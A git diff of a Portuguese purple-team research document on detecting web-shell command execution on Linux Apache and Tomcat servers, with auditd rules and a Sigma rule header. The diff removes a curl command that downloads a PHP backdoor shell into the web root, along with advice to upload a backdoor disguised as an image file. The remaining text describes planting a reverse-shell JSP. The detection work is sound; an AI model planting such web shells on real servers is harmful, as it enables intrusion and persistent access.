@@ -4,16 +4,15 @@
 
 # CTI Purple Team -  Execução de Comando Através de Web Shells em Servidores Web no Linux
 
-<kbd>Pesquisador</kbd> : <span style="color:purple"> **Bryenne Bonfim**</span>
+$\color{black}{\textsf{Pesquisador}}$ : $\color{red}{\textsf{Bryenne Bonfim}}$
 
-<kbd>Tipo de Ameaça</kbd> : <span style="color:orange"> **TTP**</span>
+$\color{black}{\textsf{Tipo de Ameaça}}$ : $\color{orange}{\textsf{RTTP}}$
 
-<kbd>TLP</kbd> : <span style="color:red"> **RED**</span>
+$\color{black}{\textsf{TLP}}$ :  $\color{red}{\textsf{RED}}$
 
-<kbd>Nível de Impacto</kbd> : <span style="color:red"> **Alta**</span>
+$\color{black}{\textsf{Nível de Impacto}}$ :  $\color{red}{\textsf{Alta}}$
 
-<kbd>Tipo de Impacto</kbd> : <span style="color:red"> **Persistência**</span>
-
+$\color{black}{\textsf{Tipo de Impacto}}$ :  $\color{red}{\textsf{Persistência}}$
 -----------
 
 **Web Shell** é uma técnica eficaz para estabelecer e manter [*Persistência*](https://attack.mitre.org/tactics/TA0003/) em Servidores Web acessíveis pela internet. Essa técnica é descrita pelo [*MITRE ATT&CK*](https://attack.mitre.org/) como [*Server Software Component: Web Shell - T1505.003*](https://attack.mitre.org/techniques/T1505/003/). A eficácia dos Web Shells advém do fato de serem desenvolvidos na mesma linguagem de programação utilizada pela aplicação web alvo, permitindo que o artefato malicioso se disfarce entre os arquivos benignos. A falta de gerenciamento de segurança das Aplicações Web facilita ainda mais a implantação de uma Web Shell entre os arquivos legítimos da aplicação, muitas vezes sem que os responsáveis notem sua presença.
@@ -26,7 +25,7 @@ Abaixo, podemos observar de forma resumida como ocorre o processo de execução 
 
 Esse método é amplamente utilizado por grupos de ***Ameaça Persistente Avançada*** (como [*APT38*](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-239a), [*APT39*](https://www.mandiant.com/resources/blog/apt39-iranian-cyber-espionage-group-focused-on-personal-information), [*Sandworm*](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf) entre muitos outros). A execução dos procedimentos relacionados a essa técnica já foi identificada em servidores Linux. Portanto, é extremamente importante entender como a execução de comandos através de Web Shells pode ser identificada em servidores Linux.
 
-Esta pesquisa tem como objetivo desenvolver inteligência através da emulação da TTP *T1505.003*, com o objetivo de criar assinaturas de detecção para os principais servidores web utilizados em sistemas Linux (como Apache, Nginx e Tomcat), instalados em servidores Linux.
+Esta pesquisa tem como objetivo desenvolver inteligência através da emulação da TTP *T1505.003*, com o objetivo de criar assinaturas de detecção para os principais servidores web utilizados em sistemas Linux (como Apache e Tomcat), instalados em servidores Linux.
 
 ## Contexto
 
@@ -75,43 +74,22 @@ Escolha qualquer exemplos de shells web php. Por exemplo:
 Agora, qualquer pessoa com acesso `http://ip_servidor_vítima/shell.php` poderá acessar o shell da web e executar comandos arbitrários.
 
 <p align="center">
-  <img src="Imagens/shell da web.png" >
+  <img src="Imagens/shell reverso php.png" >
 </p>
 
-E se você não tiver acesso ao shell? Você pode conseguir instalar um web shell por meio de um upload irrestrito. Faça upload do seu backdoor php como `image.png.php` e o backdoor pode ser acessível em `http://ip_servidor_vítima/uploads/image.png.php`.
-
-Outro comando possível que você pode usar é:
-
-```zsh
-sudo curl https://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/PHP_Shell.php -o /var/www/html/backdoor_shell.php
-``` 
-
-## Detecção de Ameaça I - Criação, Modificação e Execução de Comandos de Arquivos PHP
-
-### Usando Auditd para Monitorar Criação e Mudanças no Arquivo
-
-Para capturar os logs gerados pela criação ou modificação de arquivos php, podemos adicionar a seguinte regra ao arquivo auditd, para monitorar mudanças feitas nos arquivos criados no arquivo /var/www/html:
-
-```zsh
--w /var/www/html -p wa -k www_changes
-```
-
-E você pode pesquisar todas as gravações ou atualizações de arquivos `/var/www/html` usando o filtro `tags: www_changes` ou `key="www_changes"`. Vamos usar o arquivo `phpshell.php`, como exemplo.
-
-Os logs auditd brutos se parecem com isto:
+Abaixo, podemos observar a sequência de execução dos comandos ls e cat.
 
 <p align="center">
-  <img src="Imagens/LOG BRUTO CRIAÇÃO DE WEB SHELL.png" >
+  <img src="Imagens/comando ls =alh.png" >
 </p>
 
-Isso nos permite observar:
+<p align="center">
+  <img src="Imagens/comando cat php.png" >
+</p>
 
-- `euid=0`: UID efetivo da ação
-- `comm="nano" exe="/usr/bin/nano”`: o comando que foi executado
-- `name="/var/www/html" ... name="phpshell.php"`: o arquivo de saída
-- `key="www_changes"`: a chave do alerta auditd que foi disparado
+## Detecção de Ameaça I - Web Shell Apache PHP
 
-### Procurando Execução de Comando para www-data Usando Auditd
+### Usando Auditd para Monitorar Execução de Comando para www-data
 
 Quando executamos servidores web como `apache` o serviço será executado sob o usuário `www-data`. Em operações regulares, não devemos esperar ver o usuário executando comandos como `whoami` ou `ls` 
 
@@ -124,23 +102,13 @@ Aqui está uma regra do auditd que procurará por syscalls `execve` por `www-dat
 -a always,exit -F arch=b32 -F euid=33 -S execve -k detect_execve_www
 ```
 
-Abaixo, podemos observar a sequência de execução dos comandos whoami e ls -alh.
-
-<p align="center">
-  <img src="Imagens/comando whoami.png" >
-</p>
-
-<p align="center">
-  <img src="Imagens/comando ls =alh.png" >
-</p>
-
 Obtemos os seguintes logs auditd analisados ​​pelo auditd:
 
 <p align="center">
   <img src="Imagens/log gerados execução de comandos.png" >
 </p>
 
-Aqui está um exemplo de um log auditd bruto para `ls -alh` 
+Aqui está um exemplo de um log auditd bruto para `ls` 
 
 <p align="center">
   <img src="Imagens/log bruto execução comando ls.png" >
@@ -152,7 +120,7 @@ Isso nos permite observar:
 - `comm="ls" exe="/usr/bin/ls”` - o comando que foi executado
 - `key="detect_execve_www"`- a chave do alerta auditd que foi disparado
 
-## Emulação de Ameaça II - Instalando Web Shell com Apache Tomcat
+## Emulação de Ameaça II - Web Shell / Reverse Shell tomshell.jsp
 
 Normalmente, o Tomcat é executado por um usuário específico (tomcat, www-data, etc.). Você deve saber sob qual usuário o Tomcat está rodando. Você pode verificar isso com o comando:
 
@@ -160,8 +128,24 @@ Normalmente, o Tomcat é executado por um usuário específico (tomcat, www-data
 ps aux | grep tomcat
 ```
 
-## Detecção de Ameaça II - Criação, Modificação e Execução de Comandos de Arquivos PHP
-### Procurando Execução de Comando para  Usando Auditd
+Crie um arquivo JSP no diretório padrão do seu servidor ou o diretório de sua preferência, aqui usaremos o diretótio do Tomcat padrão do servidor localizado em `/opt/tomcat/webapps/ROOT/`.
+
+<p align="center">
+  <img src="Imagens/conexao reversa tomcat.png" >
+</p>
+
+Abaixo, podemos observar a sequência de execução dos comandos whoami e ls.
+
+<p align="center">
+  <img src="Imagens/EXECUÇÃO DE COMANDO TOMCAT.png" >
+</p>
+
+<p align="center">
+  <img src="Imagens/EXECUÇÃO DE COMANDO TOMCAT WHOAMI.png" >
+</p>
+
+## Detecção de Ameaça II - Web Shell / Reverse Shell (Java) no Tomcat Server
+### Procurando Execução de Comando Usando Auditd
 
 Para monitorar a execução de comandos através de uma web shell .jsp usando auditd, você pode configurar regras de auditoria para capturar execuções de processos que são iniciados pelo servidor de aplicação (como Tomcat). O objetivo é capturar a execução de qualquer comando que possa ser iniciado através de scripts JSP.
 
@@ -171,16 +155,6 @@ Supondo que o Tomcat esteja sendo executado pelo usuário tomcat, você pode mon
 -a always,exit -F arch=b64 -S execve -F euid=tomcat -k command_exec
 -a always,exit -F arch=b32 -S execve -F euid=tomcat -k command_exec
 ```
-
-Abaixo, podemos observar a sequência de execução dos comandos whoami e ls -alh.
-
-<p align="center">
-  <img src="Imagens/EXECUÇÃO DE COMANDO TOMCAT.png" >
-</p>
-
-<p align="center">
-  <img src="Imagens/EXECUÇÃO DE COMANDO TOMCAT WHOAMI.png" >
-</p>
 
 Aqui está um exemplo de um log auditd bruto para `whoami`
 
@@ -212,7 +186,7 @@ No contexto da implementação de uma Web Shell ou Shell Reversa em servidores T
 - Verificar os logs específicos do Tomcat em `/opt/tomcat/webapps/ROOT/` ou no diretório configurado pelo administrador.
 ----------------
 
-### Padrão SIGMA: Account Manipulation: SSH Authorized Keys
+### Padrão SIGMA: Server Software Component: Web Shell in Linux Server
 
 ```yaml
 title: 'Linux - Execução de Comando Através de Web Shells em Servidores Web no Linux - BASELINE'
